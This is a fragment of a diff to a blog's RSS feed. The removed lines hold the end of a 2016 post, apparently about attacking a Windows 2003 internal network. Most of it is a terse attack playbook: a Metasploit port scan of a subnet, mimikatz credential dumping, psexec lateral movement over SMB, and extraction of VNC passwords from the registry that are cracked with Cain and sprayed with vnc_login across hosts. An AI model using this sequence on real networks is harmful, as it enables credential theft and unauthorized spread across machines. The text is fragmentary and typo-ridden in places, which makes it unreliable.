-(handler)&amp;gt;use auxiliary/scanner/portscan/tcp
-set ports 25,110,21,80,8080,443,1433,3606,3389,5900
-set rhosts 10.10.10.0/24
-set threads 24
-exploit
-
-smb:
-(handler)use exploit/windows/smb/psexec
-(handler)set rhosts 10.10.10.0/24
-(handler)set username and pass from sekurlsa::logonpasswords in mimikatz before
-or the password find by mimikatz in msf:
-load  mimikatz
-mimikatz_command -f sekurlsa::searchPasswords
-(handler)exploit
-enter other pc by smbpass
-use mimikatz to find morepassword
-search regedit to find morevncpassword
-
-vnc:
-search winvnc password in 10.10.10.1:
-if ini file with password was delete,then open regedit search &quot;password&quot; 
-F3+F3+F3...
-find vnc password
-use vnccrack tool in cain to carck it
-get vncpassword
-use auxiliary/scanner/vnc/vnc_login
-set rhosts 10.10.10.0/24
-set password vpnpassword
-exploit
-enter other pc by vnc password
-use mimikatz to find morepassword
-search regedit to find morevncpassword
-
-smb&amp;amp;vnc
-use morepassword in exploit/windows/smb/psexec
-use morevncpassword in auxiliary/scanner/vnc/vnc_login
-
-
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Sun, 10 Apr 2016 00:00:00 +0800</pubDate>
-        <link>/web/2016/04/10/windows-2003-inside-network-aspx/</link>
-        <guid isPermaLink="true">/web/2016/04/10/windows-2003-inside-network-aspx/</guid>
-        
-        <category>inside network</category>
-        
-        <category>windows</category>
-        
-        <category>aspx</category>
-        
-        <category>工作组</category>
-        
-        
-        <category>web</category>
         
       </item>
     
